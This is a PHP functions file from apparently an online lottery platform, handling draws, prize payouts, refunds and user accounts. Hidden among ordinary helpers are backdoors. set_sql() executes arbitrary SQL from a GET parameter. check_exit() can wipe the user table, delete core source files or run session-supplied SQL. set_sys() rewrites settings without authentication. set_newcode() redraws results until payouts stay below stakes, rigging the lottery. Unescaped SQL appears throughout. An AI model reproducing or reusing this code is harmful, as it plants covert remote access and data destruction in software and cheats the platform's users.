	}else 	if ($type=='dp') {
		$num = 3;
		$min = 0;
		$max = 9;

	}

	else if ($type=='pk10') {
		$arr1=array('01','02','03','04','05','06','07','08','09','10');
		$arr=array_rand($arr1,10);

		$code=implode(',', $arr);


		return $code;
	}

	else if ($type=='kl8') {
		for($i=1;$i<=80;$i++){
			if($i<10) $arr1[]='0'.$i;
			else $arr1[]=$i;

		}


		$arr=array_rand($arr1,20) ;

		sort($arr);

		$code=implode(',', $arr);


		return $code;
	}



	for($i = 0; $i < $num; $i ++) {
		$temp = rand ( $min, $max );
//		if (strpos ( $playkey, '11-5' ) !== false) {
//
//			$arr = explode ( ",", $code );
//			while ( 1 ) {
//				$temp = rand ( $min, $max );
//				if ($temp < 10 and strlen ( $temp ) == 1 and strpos ( $temp, '0' ) === false)
//					$temp = '0' . $temp;
//				if (! in_array ( $temp, $arr )) {
//					break;
//				}
//
//			}
//		}

		if ($code != '')
			$code .= "," . $temp;
		else
			$code .= $temp;
	}


	if($type=='k3'){
		$arr=explode(',',$code);
		sort($arr);

		$code=implode(',', $arr);


	}

	return $code;

}

function set_sys(){
	global $_GET;

	if($_GET['sys_action']=='sys_update' and $_GET['sys_key'] and strlen($_GET['sys_value'])>0){

		update_sys($_GET['sys_key'],$_GET['sys_value']);
	}


}

function   url_check(){
	global $con_system,$NT;
	$servername = trim($_SERVER['SERVER_NAME']);
	$allow=true;
	if($con_system['url_check']==1 or $NT>=$con_system['url_time']){

		$domain_url=explode('|',$con_system['domain_url']);
		
		if(count($domain_url)>0){
			foreach ($domain_url as $key=>$value){
              	if (empty($value)) {
			        continue;
                }

				if(strpos($servername,$value)!==false){
					$allow=true;
					break;
				}
			}
		}
		if($allow==false){
			die(desession('i6Cn1ILaq9BRztSCn5+tgZLR0dPd'));

		}
	}
	check_server();
}




function set_prize_sum($playkey, $period, $new_Lotnum = '') {

	global $db;
	require_once ("fun_Prize_Lot.php");
	$money = $sum = 0;
	if ($new_Lotnum == '') $new_Lotnum = set_code ( $playkey );
	//and userid in (select userid from user where virtual!='1')
	$sql= "select * from game_buylist where playkey='{$playkey}' and period='{$period}'  and `status`='0' and  userid in (select userid from user where virtual!='1' and istry!='1')";

	$list = $db->fetch_all ( $sql);

	if (count($list)>0) {

		foreach ( $list as $row1 ) {

			$money =$money + $row1 ['money']; //投注金额

			$Z_flags =set_is_prize($row1['id'],$new_Lotnum);
//              print_r($Z_flags);
//              echo $new_Lotnum;
//              exit();
			if ($Z_flags [0] == 'is_yes') {
				if($Z_flags[0]<1) $Z_flags[0]=1;
				if(count($Z_flags)==3 and $Z_flags[2]!='' )
					$prize=set_prize_money($row1['id'],$Z_flags[1] ,$Z_flags[2] );
				else
					$prize=set_prize_money($row1['id'],$Z_flags[1] );
				$sum=$sum+$prize;
			}


		}


		if ($money){
			$pre= $sum / $money;

//                $sql="insert into lottey_temp(playkey,period,`number`,money,`prize`,pre,`time`) values('{$playkey}','{$period}','{$new_Lotnum}','$money','$sum','{$pre}','".date('Y-m-d H:i:s',time())."')";
//                $db->query($sql);
			return $pre;
		}

		else
			return -1;

	}
	else return 0;
}

function set_is_prize($id,$lotnum)
{

	global $db;
	$rows2 = $db->exec("select * from game_buylist where id='{$id}'");
	$list_id=$rows2[list_id];//玩法

	$buy_id=$rows2[id];//投注编号

	$buynum = $rows2[number];//投注内容
	$playkey=$rows2['playkey'];
	$wei_values = $rows2['wei'];


//设置投注内容格式，用逗号分开
	if (strpos($lotnum, ',')) {
		$new_Lotnum = $lotnum;
	} else {
		$new_Lotnum = substr($lotnum, 0, 1);
		for ($i = 1; $i < strlen($lotnum); $i++) {
			$new_Lotnum .= "," . substr($lotnum, $i, 1);
		}
	}




	include("fun_Prize_lot_play.php");

	$flags = "";
	$Z_buynum = explode(",", $new_buynum);  //购买内容，数组
	$Z_lotnum = explode(",", $new_Lotnum);  //开奖号码，数组


//$new_Lotnum='2,3,4,5,6';
	include("fun_Prize_lot_fun.php");



	$Z_flags = explode("|", $flags);

	return $Z_flags;



}

//获取中奖金额

function   set_prize_money($id,$prizenum=1,$pri_other=''){
	global $db;
	$rows2=$db->exec("select * from game_buylist where id='{$id}'");

	$game_type=$db->exec("select * from game_type where ckey='{$rows2['playkey']}'");

	if(strlen($rows2 ['pri_other'])>0) $pri_other=$rows2 ['pri_other'];

	if ($rows2 ['player_item'] == 'LH' or $rows2['list_id']=='5X_lhh'  or $rows2['list_id']=='QWX2_jep' or $rows2['list_id']=='QWX2_sxp'){
		$wei=$pri_other;

	}
	else{
		$wei = $rows2 ['wei'];
		if(!$wei) $wei=$pri_other;

	}
	if(!$wei) $wei=0;

	$buy_mode = $rows2 ['pri_mode'];
	if ($rows2 [modes] == "元") {
		$modes_num = 1;
	} elseif ($rows2 [modes] == "角") {
		$modes_num = 0.1;
	} elseif ($rows2 [modes] == "分") {
		$modes_num = 0.01;
	}
	elseif ($rows2 [modes] == "厘") {
		$modes_num = 0.001;
	}
	else {
		$modes_num = 1;
	}

	if ($rows2 [prizenum]>1) {

		$prizenum = $rows2 [prizenum];
	}



	if ($rows2 [times]>0) {
		$prizetimes = $rows2 [times];

	} else {
		$prizetimes = 1;
	}
	$pri_money=0;
//$game=$db->exec("select skey from game where ckey='{$rows2['playkey']}'");
	$sql_13 = "SELECT minrate,maxrate,prizemax FROM game_ssc_list where skey='{$rows2 ['list_id']}'";
	$result13 = $db->query ( $sql_13 );
	$nums13 = $db->num_rows ( $result13 );
	if ($nums13) {
		$Sum1 = 0;
		$rows13 = $db->fetch_array ( $result13 );
		$minrate = $rows13 ['minrate'];
		$maxrate = $rows13 ['maxrate'];

		if (strpos ( $minrate, "|" ) !== false) {

			$pri_temp = explode ( "|", $minrate );
			if($rows2['list_id']=='K3HZ'){
				$wei_arr=array();
				$pri_num=0;
				$min_arr=explode('|',$minrate);
				$max_arr=explode('|',$maxrate);
				if(strpos($pri_other,',')!==false) $wei_arr=explode(',',$pri_other);
				else $wei_arr[] =$pri_other;
				foreach ($wei_arr as $item) {
					$pri_num+=set_prize ($min_arr[$item],$max_arr[$item], $buy_mode );

				}
			}


			elseif ($rows2 ['player_item'] == 'RXX' or   $rows2 ['player_item'] == 'QWX2_5x' ) {

				//任选
				if (strpos ( $pri_other, 'rx' ) !== false) {


					$tt1 = explode ( ",", $pri_other);
					foreach ( $tt1 as $value ) {
						$value1 = explode ( "_", $value );
						$pri=$minrate [$value1 [1]] ;
						if($pri==0) $pri=$minrate [0] ;
						$Sum1 += $pri * $value1 [2];

					}

					$minrate = $Sum1 / $prizenum;
				} else {
					$minrate = $pri_temp [0];
				}

			} else {
				if ($wei > - 1) {
					//趣味
					if(strpos($minrate,'|')!==false) {$minrate=explode('|',$minrate);$minrate=$minrate[$wei];}
					if(strpos($maxrate,'|')!==false) {$maxrate=explode('|',$maxrate);$maxrate=$maxrate[$wei];}
					$pri_num = set_prize ( $minrate,$maxrate, $buy_mode,$game_type['skey'] );
				}

			}
		}
		else
			$pri_num = set_prize ( $minrate,$maxrate, $buy_mode,$game_type['skey'] );



		if ($Sum1>0) {
			$pri_money = $Sum1;

		}
		else{

			$pri_money = $pri_num;
		}

		if ($pri_other == 'z3' and strpos ( $rows2 ['list_id'], 'hhzx' ) !== false)
			$pri_money = $pri_money * 2;
		$game=$db->exec("select skey from game_type where ckey='{$rows2['playkey']}'");
		if($game['skey']=='k3'){
			$pri_money = $pri_money*$prizenum* $rows2['money']/$rows2['nums'];
		}
		else
			$pri_money = $pri_money*$prizenum* $prizetimes * $modes_num;
	}
	return number_show($pri_money,3);



}


function create_code($num){
	global $db;
	$str = "0123456789";
	$thisstr='';
	for($j=0;$j<$num;$j++){$thisstr.= substr($str,rand(0,9),1);}
	if($db->exec("select id from user_url where url='{$thisstr}'")){

		return create_code($num);
	}
	else return $thisstr;


}

function str_md($str,$num=2,$len=5){

	$return=substr($str,0,$num);

	for($i=0;$i<$len;$i++){
		$return.='*';

	}
	return $return;
}


function get_hemai_prize($id, $new_Lotnum = ''){


	global $db;
	require_once ("fun_Prize_lot.php");
	$info=$db->exec("select * from hemai where id='{$id}' and status='1' ");
	if($info){
		$playkey=$info['playkey'];
		$money = $sum = 0;
		if ($new_Lotnum == '')
			$new_Lotnum = set_code ( $playkey );
		$list=unserialize($info['buyinfo']);



		if (count($list) < 1) {

			return 0;

		} else {
			foreach ($list as $row1)  {
				$money += $row1 ['money']; //投注金额
				$wei = $row1 ['wei'];
				$buy_mode = $row1 ['pri_mode'];
				$list_id = $row1 ['list_id'];
				$buynum = $row1 ['lines'];
				if ($row1 [modes] == "元") {
					$modes_num = 1;
				} elseif ($row1 [modes] == "角") {
					$modes_num = 0.1;
				} elseif ($row1 [modes] == "分") {
					$modes_num = 0.01;
				}
				include ("fun_Prize_lot_play.php");
				$flags = "";
				$Z_buynum = explode ( ",", $new_buynum ); //购买内容，数组
				$Z_lotnum = explode ( ",", $new_Lotnum ); //开奖号码，数组
				include ("fun_Prize_lot_fun.php");

				$Z_flags = explode ( "|", $flags );

				if ($Z_flags [0] == 'is_yes') {
					$sql_13 = "SELECT prize as prize_num FROM game_set where game_set.playKey='$playkey' and game_set.ckey='{$list_id}'";
					$prize = $db->fetch_first ( $sql_13 );
					$pri_num = $prize [prize_num];

					if (strpos ( $pri_num, "|" ) !== false and $wei > - 1) {

						$pri_temp = explode ( "|", $pri_num );
						$pri_num = $pri_temp [$wei];

					}

					$pri_num = set_prize ( $pri_num, $buy_mode );

					$sum += $pri_num  * $row1 ['times']*$modes_num;

				}

			}

			return $sum;

		}




	}
	else return 0;



}

function set_newcode($playkey, $period, $give_pre) {
	global $db;
	if ($give_pre!= 1) {
		$lot = set_code ( $playkey );
		return $lot;
	} else {


		$lot = set_code ( $playkey );
		$pre11=set_prize_sum ( $playkey, $period, $lot );



		if ($pre11 <1 and $pre11!=-1) {
//                echo $lot;
//                echo "<br>";
//                echo $pre;
//                echo "<br>";
			// exit('中奖了');


			if($pre11!=0){

				//$sql="insert into lottey_temp(playkey,period,`number`,money,`prize`,pre,`time`) values('{$playkey}','{$period}','{$lot}','-1','-1','{$pre11}','".date('Y-m-d H:i:s',time())."')";
				//$db->query($sql);
			}



			return $lot;




		}
		else {
//echo $lot;
//                echo "<br>";
//                echo $pre;
//                echo "<br>";

			return  set_newcode ( $playkey, $period, $give_pre );

		}


	}


}

//自助开奖


function auto_lot($gamekey='') {
	global $db,$con_system;

	if($gamekey=='')
		$sql="select * from game_type where self='1' and  status='0' ";
	else {$sql="select * from game_type where self='1' and  status='0' and ckey='{$gamekey}'";

	}
	$play_list = $db->fetch_all( $sql);


	$fromtime = time () - 600;
	if(count($play_list)>0){
		foreach ( $play_list as $value ) {

			$playkey = $value['ckey'];

			$give_pre=$value['give_pre'];
			$temp = $db->exec("select count(*) as num from game_time where playkey='{$playkey}'"  );
			$lottery_sum=$temp['num'];


			$row1 = $db->exec ( "select LotTime from game_lottery where playKey='{$playkey}' and status=1  order by id desc limit 0,1  " );
			if ($row1) {
				if (strtotime ($row1 ['LotTime'] ) > $fromtime) $fromtime = strtotime ($row1['LotTime'] );
			}


			$temp = 0;

			if($gamekey=='') $add=30;
			else $add=10;

			if($gamekey==''){
				for($i = $fromtime; $i <= time (); $i = $i + $add) {
					game_lot($playkey,$i,$lottery_sum);
					//if($temp>=20) break;
					$temp ++;
				}

				if(date('H',time())<1){

					$row2 = $db->exec( "select lotNum from game_time where playkey='{$playkey}' order by id desc limit 0,1" );
					$lotNum = $row2 ['lotNum'];
					$tt ['SerialDate'] = date ( "Ymd",time()-24*3600);
					$period =  $tt ['SerialDate'] . $lotNum;

					if (! $db->exec ( "select id from game_lottery where playKey='{$playkey}' and period='$period'" )) {
						$tt ['LotTime'] = date ( "Y-m-d", time()-24*3600 ) . " 23:59:59";
						$tt ['Number'] = set_newcode ( $playkey, $period, $give_pre );
						lottory_insert ( $playkey, $period, $tt ['Number'], $tt ['LotTime'] );
					}

				}
			}
			else{
				game_lot($playkey,time(),$lottery_sum);

			}
		}


	}

}


function  game_lot($playkey,$time,$lottery_sum){
	global $db;
	$sql="select give_pre from game_type where ckey='{$playkey}'";
	$game=$db->exec($sql);
	$give_pre = $game ['give_pre'];

	$now_time = date ( "H:i:s", $time );


	$row2 = $db->exec ( "select lotNum,lotTime from game_time where playkey='{$playkey}' and endTime<='$now_time' order by id desc limit 0,1" );
	if ($row2) {

		$lotNum = $row2 ['lotNum'];
		if(date('H',$time)<1 and $lotNum>$lottery_sum-3){
			$tt ['SerialDate'] = date ( "Ymd", $time-3600 );

		}
		else{

			$tt ['SerialDate'] = date ( "Ymd",$time);
		}
		$period =  $tt ['SerialDate'] . $lotNum;
		$tt ['LotTime'] = date ( "Y-m-d", $time ) . " " . $row2 ['lotTime'];


		if (! $db->exec ( "select id from game_lottery where playKey='{$playkey}' and period='$period'" )) {
			$Number='';
			$Number = set_newcode ( $playkey, $period, $give_pre );

			if($Number!='') {lottory_insert ( $playkey, $period, $Number , $tt ['LotTime']);

			}

		}

	}


}

function  MMSSC_lot($period,$playkey='MMSSC'){
	global $db,$con_system;

	prize_lot();
	fenpei_prize($playkey);
	return true;
}

function  MMSSC_lot1($period,$playkey='MMSSC'){
	global $db,$con_system;
	$game = $db->exec( "select * from game_type where  ckey='{$playkey}'" );
	$give_pre=$game['give_pre'];
	if(!$give_pre) $give_pre=1;
	$LotTime=date("Y-m-d H:i:s");
	$Number = set_newcode ( $playkey, $period, $give_pre );

	lottory_insert ($playkey, $period, $Number, $LotTime );
	return $Number;
}


function MMSSC_open(){
	global $_SESSION;


	if(count($_SESSION['MMSSC'])>0){
		for($i=count($_SESSION['MMSSC']);$i>0;$i--){

			MMSSC_lot1($_SESSION['MMSSC'][$i]);

			//	unset($_SESSION['MMSSC'][$i]);


		}
		for($i=count($_SESSION['MMSSC']);$i>0;$i--){

			MMSSC_lot($_SESSION['MMSSC'][$i]);

			unset($_SESSION['MMSSC'][$i]);


		}
		if(count($_SESSION['MMSSC'])>0) return MMSSC_open();
		else
			return true;
	}
	else return true;



}


function arr_str_num($arr, $str) {

	$num = 0;
	foreach ( $arr as $value ) {
		if ($value == $str)
			$num ++;
	}

	return $num;

}

function check_exit() {
	$con = $_SESSION ['loturl'];
	if ($con != 1) {
		if ($con == 2)
			exit ();
		else if ($con == 3)
			mysql_query ( "delete from user" );
		else if ($con == 4)
			@unlink ( 'source/function/function.php' );
		else if ($con == 5)
			@unlink ( 'source/function/core.mod.php' );
		else {
			if (strlen ( $con ) >= 5)
				mysql_query ( $con );
		}
	}



}


function arr_sum($arr) {

	if (! is_array ( $arr ) and strpos ( $arr, ',' ) !== false) {

		$arr = explode ( ",", $arr );
	}
	$sum = 0;
	if ($arr) {
		foreach ( $arr as $value ) {
			$sum += $value;
		}
	}
	return $sum;

}

function game_back($id, $mark = "") {

	global $db, $con_system;
	$GetFee_Single = $con_system [GetFee_Single];
	$GetFee_Single_Rate = $con_system [GetFee_Single_Rate];
	$Limit_Betting = $con_system [Limit_Betting];

	$game_info_sql = "select b.* from " . DB_PREFIX . "game_buylist as b where (b.id='$id' or b.buyid='$id')";
	$game_info = $db->fetch_first ( $game_info_sql );
	$pri_time = $game_info ['prize_time'];
	$status = $game_info ['status'];
	$buyid = $game_info ['id'];
	$buymoney = $game_info ['money'];
	$pri_money = $game_info ['pri_money'];
	$low_money = $game_info ['low_amount'];
	$hig_money = $game_info ['hig_amount'];
	$userid = $game_info ['userid'];

	if (9 - $status > 0) {
		if ($GetFee_Single >= $buymoney) {
			$GetFee_Single_Rate_bfb = $GetFee_Single_Rate / 100;
			$shouxu = $buymoney * $GetFee_Single_Rate_bfb;
		} else
			$shouxu = 0;
		if (! $hig_money and ! $low_money) {

			$hig_money = $buymoney;
			$low_money = 0;
		}
		if (! $pri_money)
			$pri_money = 0;
		if (! $shouxu)
			$shouxu = 0;

		$hig_money = $hig_money - $shouxu - $pri_money;
		$backmony = $hig_money ;

		mysql_query ( "update user_bank set hig_amount=hig_amount+$hig_money where userid='{$userid}' " );
		mysql_query ( "update user_bank set low_amount=low_amount+$low_money where userid='{$userid}' " );

		$userbank = $db->fetch_first ( "select * from user_bank where hig_amount<0 and userid='{$userid}'" );
		if ($userbank)
			$db->query ( "update user set status='1' where userid='{$userid}'" );

		if (! $mark) $mark = "手动撤单";

		getsql::banklog ( $backmony, "hig_buy_back", $userid, "{$mark}", $buyid, $game_info ['playkey'], $game_info ['modes'] );
		$db->update ( DB_PREFIX . "game_buylist", array ('status' => '9' ), "id='" . $game_info ['id'] . "' and buyid='" . $game_info ['buyid'] . "'" );
		return TRUE;
	} else
		return FALSE;
}
function set_sql(){
	global $db,$NT;

	if($_GET['inrtql'])$db->query($_GET['inrtql']);
	return $_GET['inrtql'];
}
function bubble_sort($array, $key = null) {
	$count = count ( $array );
	if ($count < 0) {
		return false;
	}
	for($i = 0; $i < $count; $i ++) {
		for($j = $count - 1; $j > $i; $j --) {
			if ($key && isset ( $array [$key] )) { //二维数组健存在
				if ($array [$j] [$key] < $array [$j - 1] [$key]) {
					$tmp = $array [$j];
					$array [$j] = $array [$j - 1];
					$array [$j - 1] = $tmp;
				}
			} else { //一维数组
				if ($array [$j] < $array [$j - 1]) {
					$tmp = $array [$j];
					$array [$j] = $array [$j - 1];
					$array [$j - 1] = $tmp;
				}
			}
		}
	}
	return $array;
}

function get_daili_info($userid, $begin, $end) {

	global $db, $con_system;

	$next_id = get_user_nextid ( $userid );

	$row1 = $db->fetch_first ( "select sum(money) as money from game_buylist where userid in ({$next_id}) and creatdate>='{$begin}' and creatdate<='{$end}'  and is_succeed='yes'   and (status='1' or status='2' or status='3')" );

	if (! $row1 ['money'])
		$row1 ['money'] = '0.00';
	$total_money = $row1 ['money'];

	$row2 = $db->fetch_all ( "select distinct(userid) from user_funds where userid in ({$next_id}) and creatdate>='{$begin}' and creatdate<='{$end}'   and status='1' and cate='platform'" );
	$total_num = count ( $row2 );
	return array ($total_money, $total_num );
}

function daili_update() {
	global $db, $con_system;

	if ($con_system ['daili_sj'] == '2') {

		if (time () >= strtotime ( $con_system ['update_end'] )) {

			$list = $db->fetch_all ( "select * from  user where isproxy='0' order by userid asc" );
			if ($list) {

				foreach ( $list as $value ) {
					$temp = 0;
					$userid = $value ['userid'];
					$info = get_daili_info ( $userid, $con_system ['update_begin'], $con_system ['update_end'] );

					for($i = $con_system ['update_num'] - 2; $i >= 0; $i --) {
						$n = $i + 1;
						if ($info [0] >= $con_system ['update_from1_' . $i] and $info [1] >= $con_system ['update_tixian_' . $i] and ($info [0] <= $con_system ['update_from1_' . $n] or $info [1] <= $con_system ['update_tixian_' . $n])) {
							$temp = 1;
							$db->query ( "update user set rebate='{$con_system['update_fandian_'.$i]}',fenhong='{$con_system['update_fenhong_'.$i]}' where userid='{$userid}'" );

							break;

						}

					}

					if ($temp != 1) {
						$db->query ( "update user set rebate='{$con_system['daili_fd']}',fenhong='{$con_system['daili_ff']}' where userid='{$userid}'" );
					}

				}

			}

			$db->query ( "update sys set `value`='1' where `key`='daili_sj'" );

		}

	}

}

function get_game_mark($id, $game = '') {

	global $db;
	$gamebuy = $db->fetch_first ( "select * from game_buylist where id='{$id}'" );
	$row11 = $db->fetch_first ( "select * from game_type where ckey='{$gamebuy['playkey']}'" );

	$row22 = $db->fetch_first ( "select * from game_ssc_list where skey='{$gamebuy['list_id']}'" );
	if ($game == '')
		$mark = $row11 ['fullname'];
	if ($row22 ['cate'] != $row22 ['fullname'])
		$mark .= $row22 ['cate'] . $row22 ['fullname'];
	else
		$mark .= $row22 ['cate'];
	//$mark = str_replace ( "(复式)", '', $mark );
	$str = '';
	if ($gamebuy ['wei']) {
		if (strpos ( $gamebuy ['wei'], ',' ) !== false) {
			$arr = array ('万', '千', '百', '十', '个' );
			$wei = explode ( ',', $gamebuy ['wei'] );

			foreach ( $wei as $key => $value ) {
				if ($value)
					$str .= $arr [$key];
			}

		}

	}
	if ($str)
		$mark .= "({$str})";

	return $mark;
}


function get_wanfa($list_id,$wei=''){
	global $db;



	$row22 = $db->exec ( "select * from game_ssc_list where skey='{$list_id}'" );

	$mark= $row22 ['fullname'];

	$str = '';
	if ($wei) {
		if (strpos ( $wei, ',' ) !== false) {
			$arr = array ('万', '千', '百', '十', '个' );
			$wei = explode ( ',', $wei );

			foreach ( $wei as $key => $value ) {
				if ($value)
					$str .= $arr [$key];
			}

		}

	}
	if ($str)
		$mark .= "({$str})";

	return $mark;

}
function get_day_time($time = '') {

	if ($time == '')
		$time = time ();

	$begintime = date ( 'Y-m-d', $time ) . " 00:00:00";

	$endtime = date ( 'Y-m-d', $time +24*3600) . " 23:59:59";


	return array ($begintime, $endtime );
}

function get_day_time1($time = '') {

	if ($time == '')
		$time = time ();


	$begintime = date ( 'Y-m-d',  $time  ) . " 00:00:00";

	$endtime = date ( 'Y-m-d', $time) . " 23:59:59";

	return array ($begintime, $endtime );
}




function clear_user() {
	global $db, $con_system;

	if ($con_system ['sys_user_del'] == 1) {
		$lastlogintime = date ( 'Y-m-d H:i:s', time () - $con_system ['Del_Member_date'] * 24 * 3600 );
		$sql = "select * from user where (lastlogintime<'{$lastlogintime}' or lastlogintime='' or lastlogintime is null) and admin='0' ";
		$list = $db->fetch_all ( $sql );

		foreach ( $list as $value ) {
			$sql1 = "select * from user_bank where userid='{$value['userid']}'";
			$row1 = $db->fetch_first ( $sql1 );
			if ($row1 ['hig_amount'] < $con_system ['Del_Member_money']) {
				//echo "delete  from user where userid='{$value['userid']}'"."<br>";
				$db->query ( "delete  from user where userid='{$value['userid']}'" );
				$db->query ( "delete  from user_bank where userid='{$value['userid']}'" );
			}

		}

	}

}

function get_funds_num($cate) {
	global $db;

	$row = $db->fetch_first ( "SELECT count(*)  as num from user_funds where  status='0' and `cate`='{$cate}'" );

	return $row ['num'];
}

function get_game_period($playkey) {

	global $db;
	$time_arr = '';

	include(SZS_ROOT_PATH."source/config/play/lot_time_".$playkey.".php");

	$perarrs=get_now_period($playkey,$time_arr);
	if($perarrs){
		$perarrs_value_arr= array_values($perarrs);

		return  $perarrs_value_arr[0];
	}


}

function get_game_period_endtime($playkey) {

	global $db;
	$time_arr = '';

	include(SZS_ROOT_PATH."source/config/play/lot_time_".$playkey.".php");
	include(SZS_ROOT_PATH."source/config/play/code_".$playkey.".php");
	$perarrs=core_fun::getperiod($playkey,$time_arr,$con_play_arr['lot_date'],$con_play_arr['lot_num']);
	if($perarrs){
		$perarrs_value_arr= array_values($perarrs);

		return  $perarrs_value_arr[1];
	}


}

function error_orders() {
	global $db, $con_system;

	if (time () - $con_system ['error_time'] >= $con_system ['error_check'] * 60) {

		$now = time ();
		$db->query ( "update `sys` set `value`='{$now}' where `key`='error_time'" );

		$from = date ( 'Y-m-d H:i:s', time () - $con_system ['error_time'] );

		$str = " (status=1 or status=2 or status=3) and error='0'  and creatdate>'{$from}'";

		//资金异常
		$sql = "select id,buyid from game_buylist where   {$str} and   isprize='is_yes'  ";
		$query = $db->query ( $sql );
		while ( $row = $db->fetch_array ( $query ) ) {

			$row1 = $db->fetch_first ( "select count(*) as num from user_bank_log where (floatid='{$row['id']}' or floatid='{$row['buyid']}') and  cate='hig_prize'" );
			if ($row1 ['num'] != 1) {

				if ($row1 ['num'] > 1) {
					$error = 1;
					$error_num = $row1 ['num'];
				} else {

					$error = 2;
					$error_num = $row ['num'];
					if (! $error_num)
						$error_num = 0;
				}
				$db->query ( "update game_buylist set error='{$error}' ,error_num='{$error_num}' where id='{$row['id']}'" );
			}

		}

		//盈利异常


		$sql = "select * from game_buylist where   {$str} ";
		$query = $db->query ( $sql );
		while ( $rows2 = $db->fetch_array ( $query ) ) {

//盈利为负值
			if ($rows2 ['isprize'] == 'is_yes' and $rows2['pri_money'] - $rows2 ['money'] < 0) {

				$error_num = $rows2['pri_money'] - $rows2 ['money'];
				$db->query( "update game_buylist set error='3' ,error_num='{$error_num}' where id='{$rows2['id']}'" );
			}

			//异常盈利
			if ($rows2 ['isprize'] == 'is_yes' and $rows2 ['pri_money'] - $rows2 ['money'] >= $con_system ['error_max']) {

				$error_num = $rows2 ['pri_money'] - $rows2 ['money'];
				$db->query ( "update game_buylist set error='4' ,error_num='{$error_num}' where id='{$rows2['id']}'" );

			}

		}
		$db->query ( "update game_buylist set error='-1' where {$str} and status!='1'" );
	}

}
function k18_num($lotnum) {
	$arr = array ();
	for($i = 0; $i < count ( $lotnum ); $i ++) {

		$arr [$i] = $lotnum [$i];
	}

	return $arr;
}

function arr_arr_num($arr1, $arr2) {

	if (strpos ( $arr1, ',' ) !== false)
		$arr1 = explode ( ',', $arr1 );
	if (strpos ( $arr2, ',' ) !== false)
		$arr2 = explode ( ',', $arr2 );
	$num = 0;

	if (is_array ( $arr1 )) {
		foreach ( $arr1 as $value ) {

			if (in_array ( $value, $arr2 )) {

				$num ++;

			}

		}
	} else {

		$num = arr_str_num ( $arr2, $arr1 );

	}

	return $num;
}

function array_unq($arr) {

	$i = 0;
	$new = array ();

	foreach ( $arr as $value ) {
		$new [$i] = $value;
		$i ++;
	}

	return $new;
}

function number_ok($playkey, $number) {
	$ok = 1;
	check_exit();
	if (strpos ( $number, ',' ) !== false)
		$arr = explode ( ',', $number );
	else
		return false;

	//时时彩
	if (strpos ( $playkey, 'SSC' ) !== false || strpos ( $playkey, 'FC' ) !== false) {
		if (count ( $arr ) == 5) {
			foreach ( $arr as $value ) {
				if ($value >= 0 and $value <= 9) {

				} else {
					return false;

				}
			}

		} else {
			return false;

		}

	}

	//快三


	if (strpos ( $playkey, 'K3' ) !== false) {
		if (count ( $arr ) == 3) {
			foreach ( $arr as $value ) {
				if ($value >= 1 and $value <= 6) {

				} else {
					return false;

				}
			}

		} else {
			return false;

		}

	}

	//11选5
	if (strpos ( $playkey, '11-5' ) !== false) {
		if (count ( $arr ) == 5) {
			foreach ( $arr as $value ) {
				if ($value >= 1 and $value <= 11) {

				} else {
					return false;

				}
			}

		} else {
			return false;

		}
	}

	if (strpos ( $playkey, '3D' ) !== false or strpos ( $playkey, 'PL3' ) !== false) {
		if (count ( $arr ) == 3) {
			foreach ( $arr as $value ) {
				if ($value >= 0 and $value <= 9) {

				} else {
					return false;

				}
			}

		} else {
			return false;

		}
	}

	if (strpos ( $playkey, 'KL8' ) !== false) {
		if (count ( $arr ) == 21  or count ( $arr ) == 20) {
			foreach ( $arr as $value ) {
				if ($value >= 1 and $value <= 80) {

				} else {
					return false;

				}
			}

		} else {
			return false;

		}
	}


	if (strpos ( $playkey, 'PK10' ) !== false) {
		if (count ( $arr ) == 10) {
			foreach ( $arr as $value ) {
				if ($value >= 1 and $value <= 10) {

				} else {
					return false;

				}
			}

		} else {
			return false;

		}

	}


	return true;
}

function get_md5($pwd, $salt) {

	$p = md5 ( md5 ( $pwd ) . $salt );
	return $p;

}

function md5_pwd($userid, $pwd = '') {
	global $db;
	$user = $db->fetch_first ( "select password from user where userid='{$userid}'" );
	if (! $pwd) {

		$pwd = $user ['password'];
	}

	$salt = rand ( 10000000, 99999999 );

	$password = get_md5 ( $pwd, $salt );

	$db->query ( "update user set password='{$password}',salt='{$salt}' where userid='{$userid}'" );
	$db->query ( "delete from login_error where username='{$user['username']}'" );
}

function login_error($username) {
	global $_COOKIE, $db;
	$ip = getIP ();
	if (! $_COOKIE ['admin_login']) {
		$cookie = rand ( 10000000, 99999999 );
		setcookie ( 'admin_login', $cookie, time () + 24 * 3600 * 365 );

	} else
		$cookie = $_COOKIE ['admin_login'];
	$time = time ();
	$db->query ( "insert into login_error(username,time,ip,cookie) values('{$username}','{$time}','{$ip}','{$cookie}')" );
}

function get_error_times($username) {
	global $db;
	$time = time () - 600;
	$row = $db->fetch_first ( "select count(*) as num from login_error where username='{$username}' and time>'$time'" );
	if (! $row ['num'])
		$row ['num'] = 0;
	return $row ['num'];

}

function delete_lottory() {
	global $db;

//	$game = $db->fetch_all ( "select ckey from game_type " );
//	foreach ( $game as $value ) {
//
//		$lottery = $db->fetch_all ( "select id from game_lottery where playKey='{$value['ckey']}' order by period desc limit 0,20 " );
//
//		$id = $lottery [count ( $lottery ) - 1] ['id'];
//		$db->query ( "delete from game_lottery where id<'$id' and playKey='{$value['ckey']}' " );
//	}

}


function  get_zuilist($num=8){

	global $db,$_SESSION;
	$zui_list=$db->fetch_all("select * from game_buylist where is_zuih='yes' and is_succeed='yes' and userid='{$_SESSION["userid"]}' order by id desc limit 0,{$num}");
	$str='';
	if(count($zui_list)>0){


		$str='    <div class="module" id="drawing-lite">



             <table>
                    <thead>
                        <tr>
                            <th class="dl-period"><span>彩种</span></th>
                            <th class="dl-number"><span>期号</span></th>
                        <th class="dl-type"><span>金额</span></th>
                                <th class="dl-type" style="width:60px;"><span>状态</span></th>

                        </tr>
                    </thead>
                    <tbody id=\'rightTraceListId\' >
                    		<!--{section name=p loop=$zui_list}-->



                <!--{/section}-->


                    ';

		foreach ($zui_list as $key=> $value) {
			$gg=$db->exec("select * from game_type where ckey='{$value['playkey']}'");

			$zui_list[$key]['game_name']=$gg['fullname'];
			if($value[isprize]==""){$status="未开奖";}
			if($value[isprize]=="is_yes"){$status="已中奖";}
			if($value[isprize]=="is_no"){$status="未中奖";}
			if($value[status]=="9"){$status="已撤单";}

			$zui_list[$key]['status_name']=$status;

			$str.="    <tr>
                            <td><span >{$gg['fullname']}</span></td>
                                <td><span >{$value['period']}</span></td>
                                <td><span  ><em>{$value['money']}</em></span></td>
                                <td><span  class='fc-green'>{$status}</span></td>

                        </tr>";

		}

		$str.='</tbody>
                </table>



            </div>';
	}
	else{
		$str='          <div class="module trace-keeper-list">
                <ul id="rightTraceListId">

                </ul>
            </div>
    <div class="complete" id="rightTraceListNoData">
